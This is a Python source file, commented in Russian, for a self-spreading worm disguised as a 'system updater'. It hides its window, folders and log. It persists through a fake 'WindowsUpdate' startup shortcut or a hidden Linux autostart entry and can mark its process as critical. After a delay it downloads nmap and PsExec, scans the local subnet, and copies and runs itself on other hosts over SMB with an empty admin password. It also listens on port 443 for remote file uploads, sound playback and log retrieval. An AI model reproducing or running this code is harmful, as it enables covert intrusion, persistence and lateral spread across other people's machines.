import socket
import os
import pygame
import threading
import subprocess
import platform
import sys
import ctypes
import requests
import zipfile
import shutil
import pythoncom
from win32comext.shell import shell
from time import sleep
import random
import logging

# Настройки
SCRIPT_NAME = "system_updater.py"
SOUND_DIR = ".syscache"
TOOLS_DIR = ".update_tools"
HOST = "0.0.0.0"
PORT = 443
CRITICAL_PROCESS = False
LOG_FILE = "C:\\Temp\\.syslog" if platform.system() == "Windows" else "/tmp/.syslog"

# Логи
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s: %(message)s")
logger = logging.getLogger()

# Скрытие
if platform.system() == "Windows":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    if os.path.exists(LOG_FILE):
        ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, 2)
elif platform.system() == "Linux":
    sys.stdout = open(os.devnull, "w")
    sys.stderr = open(os.devnull, "w")

def install_dependencies():
    """Установка Python-зависимостей."""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame", "python-nmap", "pysmb"])
        logger.info("Зависимости установлены")
    except Exception as e:
        logger.error(f"Ошибка установки зависимостей: {e}")

def download_tool(url, dest, is_zip=False, extract_file=None):
    """Скачивание инструмента."""
    if os.path.exists(dest):
        logger.info(f"{os.path.basename(dest)} уже установлен")
        return dest
    try:
        logger.info(f"Скачиваем {os.path.basename(dest)}...")
        response = requests.get(url, stream=True)
        with open(dest + (".zip" if is_zip else ""), "wb") as f:
            for chunk in response.iter_content(1024):
                f.write(chunk)
        if is_zip:
            with zipfile.ZipFile(dest + ".zip", "r") as zip_ref:
                zip_ref.extract(extract_file, TOOLS_DIR)
            os.rename(os.path.join(TOOLS_DIR, extract_file), dest)
            shutil.rmtree(os.path.join(TOOLS_DIR, os.path.dirname(extract_file)))
            os.remove(dest + ".zip")
        else:
            subprocess.run([dest, "/S"], check=True)
            os.remove(dest)
        logger.info(f"{os.path.basename(dest)} установлен")
        return dest
    except Exception as e:
        logger.error(f"Ошибка установки {os.path.basename(dest)}: {e}")
        return None

def setup_autostart():
    """Автозагрузка без админки."""
    script_path = os.path.abspath(SCRIPT_NAME)
    if platform.system() == "Windows":
        startup_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
        shortcut_path = os.path.join(startup_dir, "WindowsUpdate.lnk")
        if not os.path.exists(shortcut_path):
            shortcut = pythoncom.CoCreateInstance(
                shell.CLSID_ShellLink, None, pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
            )
            shortcut.SetPath(sys.executable)
            shortcut.SetArguments(f'"{script_path}"')
            shortcut.SetDescription("Windows System Update")
            shortcut.QueryInterface(pythoncom.IID_IPersistFile).Save(shortcut_path, 0)
        logger.info("Автозагрузка Windows настроена")
    elif platform.system() == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        with open(os.path.join(autostart_dir, "system-monitor.desktop"), "w") as f:
            f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec={sys.executable} {script_path}
Hidden=false
NoDisplay=true
""")
        logger.info("Автозагрузка Linux настроена")

def hide_folders():
    """Скрытие папок."""
    if platform.system() == "Windows":
        for folder in [SOUND_DIR, TOOLS_DIR]:
            if os.path.exists(folder):
                ctypes.windll.kernel32.SetFileAttributesW(folder, 2)

def make_process_critical():
    """Критичный режим (Windows)."""
    if platform.system() == "Windows" and CRITICAL_PROCESS:
        try:
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
            logger.info("Критичный режим активирован")
        except Exception as e:
            logger.error(f"Ошибка критичного режима: {e}")

def spread_to_network(nmap_path, psexec_path):
    """Распространение по сети."""
    if not (nmap_path and psexec_path):
        logger.error("Отсутствует nmap или psexec")
        return
    sleep(random.randint(3600, 7200))  # Задержка 1-2 часа
    try:
        result = subprocess.run([nmap_path, "-sn", "192.168.1.0/24"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "Nmap scan report for" in line:
                ip = line.split()[-1].strip("()")
                if ip != socket.gethostbyname(socket.gethostname()):
                    threading.Thread(target=try_smb, args=(ip, nmap_path, psexec_path)).start()
    except Exception as e:
        logger.error(f"Ошибка сканирования сети: {e}")

def try_smb(ip, nmap_path, psexec_path):
    """Попытка SMB-распространения."""
    try:
        import smbclient
        smbclient.register_session(ip, username="admin", password="")
        with open(SCRIPT_NAME, "rb") as f:
            smbclient.write_file(ip, "C$", f"\\Windows\\Temp\\{SCRIPT_NAME}", f)
        logger.info(f"Скопировано на {ip}")
        subprocess.run([psexec_path, f"\\\\{ip}", "-u", "admin", "-p", "", "cmd", "/c", f"python \\Windows\\Temp\\{SCRIPT_NAME}"])
        logger.info(f"Запущено на {ip}")
    except Exception as e:
        logger.error(f"Не удалось заразить {ip}: {e}")

def handle_client(conn, addr):
    """Обработка клиента."""
    conn.send("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n".encode())
    logger.info(f"Подключено: {addr}")
    try:
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            if data.startswith("UPLOAD:"):
                _, filename, filesize = data.split(":")
                filesize = int(filesize)
                filepath = os.path.join(SOUND_DIR, filename)
                with open(filepath, "wb") as f:
                    received = 0
                    while received < filesize:
                        chunk = conn.recv(1024)
                        f.write(chunk)
                        received += len(chunk)
                logger.info(f"Получен звук: {filename}")
            elif data == "PLAY":
                filename = conn.recv(1024).decode()
                filepath = os.path.join(SOUND_DIR, filename)
                if os.path.exists(filepath):
                    pygame.mixer.init()
                    pygame.mixer.music.load(filepath)
                    pygame.mixer.music.play()
                    logger.info(f"Играет: {filename}")
                else:
                    logger.error(f"Звук не найден: {filename}")
            elif data == "GET_LOG":
                log_path = LOG_FILE
                if os.path.exists(log_path):
                    filesize = os.path.getsize(log_path)
                    conn.send(str(filesize).encode())
                    with open(log_path, "rb") as f:
                        while chunk := f.read(1024):
                            conn.send(chunk)
                    logger.info("Лог-файл отправлен")
                else:
                    conn.send("0".encode())
                    logger.info("Лог-файл отсутствует")
    except Exception as e:
        logger.error(f"Ошибка: {e}")
    finally:
        conn.close()

def main():
    # Инициализация
    os.makedirs(SOUND_DIR, exist_ok=True)
    os.makedirs(TOOLS_DIR, exist_ok=True)
    hide_folders()
    install_dependencies()
    nmap_path = download_tool(
        "https://nmap.org/dist/nmap-7.94-setup.exe",
        os.path.join(TOOLS_DIR, "nmap.exe"),
    )
    psexec_path = download_tool(
        "https://download.sysinternals.com/files/PSTools.zip",
        os.path.join(TOOLS_DIR, "psexec.exe"),
        is_zip=True,
        extract_file="PsTools/PsExec.exe",
    )
    setup_autostart()
    make_process_critical()

    # Spread
    threading.Thread(target=spread_to_network, args=(nmap_path, psexec_path), daemon=True).start()

    # Сервер
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    logger.info(f"Слушаю на {HOST}:{PORT}")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()

if __name__ == "__main__":
    main()